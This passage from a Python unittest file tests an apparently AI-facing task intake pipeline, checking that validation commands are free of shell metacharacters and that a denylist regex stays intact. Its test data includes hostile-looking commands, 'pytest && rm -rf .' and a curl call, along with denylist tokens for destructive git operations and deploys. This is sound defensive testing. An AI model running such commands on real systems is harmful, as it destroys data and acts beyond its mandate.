            ],
        ))
        intake.run_intake([issue], seen={}, sha_resolver=always_resolves)
        payload = json.loads(
            (intake.ROOT / ".ai-intake" / "tasks" / "HANDOFF-1.json").read_text(encoding="utf-8")
        )
        self.assertTrue(payload["validation_commands"])
        for cmd in payload["validation_commands"]:
            self.assertTrue(intake.validate_validation_command(cmd))
            self.assertIsNone(DOWNSTREAM.DANGEROUS_VALIDATION.search(cmd))
            for ch in intake.SHELL_META_CHARS:
                self.assertNotIn(ch, cmd)

    def test_unsafe_command_never_reaches_a_task_file(self):
        for bad in ["pytest && rm -rf .", "python3 -c import os", "curl https://x.example"]:
            with self.subTest(cmd=bad):
                issue = make_issue(301, task=make_task(
                    task_id="HANDOFF-BAD", validation_commands=[bad]
                ))
                summary = intake.run_intake([issue], seen={}, sha_resolver=always_resolves)
                self.assertEqual(summary["failed"], 1)
                self.assertFalse(
                    (intake.ROOT / ".ai-intake" / "tasks" / "HANDOFF-BAD.json").exists()
                )

    def test_downstream_denylist_left_intact(self):
        """Regression guard: downstream protection must not be weakened."""
        pattern = DOWNSTREAM.DANGEROUS_VALIDATION.pattern
        for token in ["rm\\s+-rf", "git\\s+reset\\s+--hard", "git\\s+clean",
                      "git\\s+push", "git\\s+commit", "wrangler\\s+deploy", "curl"]:
            with self.subTest(token=token):
                self.assertIn(token, pattern)


if __name__ == "__main__":
    unittest.main(verbosity=2)
